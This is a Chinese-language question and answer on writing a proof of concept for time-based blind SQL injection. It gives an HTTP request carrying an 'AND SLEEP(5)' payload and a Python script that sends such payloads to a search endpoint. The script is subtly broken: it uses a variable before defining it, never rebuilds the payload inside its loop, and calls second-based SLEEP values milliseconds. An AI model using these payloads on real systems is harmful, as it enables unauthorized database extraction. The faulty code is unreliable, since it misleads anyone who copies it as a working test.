问题： SQL注入中时间盲注的POC应该如何编写? 
回答： 好的，我会为你提供关于SQL注入中时间盲注的POC编写的详细回答。
首先需要明确的是，时间盲注是一种利用数据库响应中的延迟来推断数据的方法。在进行时间盲注时，攻击者通过构造恶意请求，在成功执行后观察服务器端对请求做出反应所需的时间，从而判断是否命中了目标语句或者条件。
下面是一个简单的示例：
```
POST /search HTTP/1.1
Host: target.com

id=42 AND SLEEP(5) --+
```
在这个例子中，我们向`target.com`发送了一个包含ID为42的数据查询的HTTP POST请求。然后我们在参数后面添加了一条带有SLEEP函数的语句，该函数会在执行过程中暂停5秒钟。如果这条语句被执行并成功返回结果，则会花费额外的5秒等待响应；反之则不会产生延时效果。
为了验证这个方法的有效性，我们可以使用以下Python脚本来测试它：
```python
import requests
import time

# 构造URL和payload
url = "http://example.com/search"
payload = f"id={42} AND SLEEP({sleep_time})"

for sleep_time in range(0, 6): # 尝试不同的睡眠时间（单位：毫秒）
    start_time = time.time()
    
    try:
        r = requests.post(url, data=payload)
        
        if (time.time() - start_time > 5):
            print(f"Sleeping for {sleep_time * 1000:.3f}ms")
            break
            
    except Exception as e:
        pass
    
print("Done!")
```

这段代码将尝试不同长度的睡眠时间和每个可能的结果交互。当检测到一个有效的查询导致了超过预期的延迟时，程序就会输出相应的消息。
需要注意的是，这只是一个非常基本的例子，实际应用中还需要考虑更多的因素，例如异常处理、错误信息隐藏等。同时，由于存在潜在的安全风险，建议不要滥用或未经授权地实施此类技术。